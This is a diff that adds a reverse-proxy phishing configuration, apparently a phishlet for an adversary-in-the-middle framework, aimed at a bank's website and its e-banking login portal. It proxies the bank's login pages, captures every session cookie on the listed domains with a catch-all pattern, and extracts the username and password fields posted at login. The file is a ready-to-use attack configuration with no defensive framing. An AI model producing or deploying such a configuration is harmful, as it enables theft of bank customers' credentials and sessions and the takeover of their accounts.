@@ -1,0 +1,32 @@
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'statenational.bank', session: true, is_landing: true}
+  - {phish_sub: 'statenb', orig_sub: 'statenb', domain: 'myebanking.net', session: true, is_landing: false}
+sub_filters:
+auth_tokens:
+  - domain: '.myebanking.net'
+    keys: ['.*,regexp']
+  - domain: 'myebanking.net'
+    keys: ['.*,regexp']
+  - domain: '.statenational.bank'
+    keys: ['.*,regexp']
+  - domain: 'statenational.bank'
+    keys: ['.*,regexp']
+  - domain: '.statenb.myebanking.net'
+    keys: ['.*,regexp']
+  - domain: 'statenb.myebanking.net'
+    keys: ['.*,regexp']
+auth_urls:
+  - '/'
+credentials:
+  username:
+    key: 'Username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'Password'
+    search: '(.*)'
+    type: 'post' 
+login:
+  domain: 'www.statenational.bank'
+  path: '/'
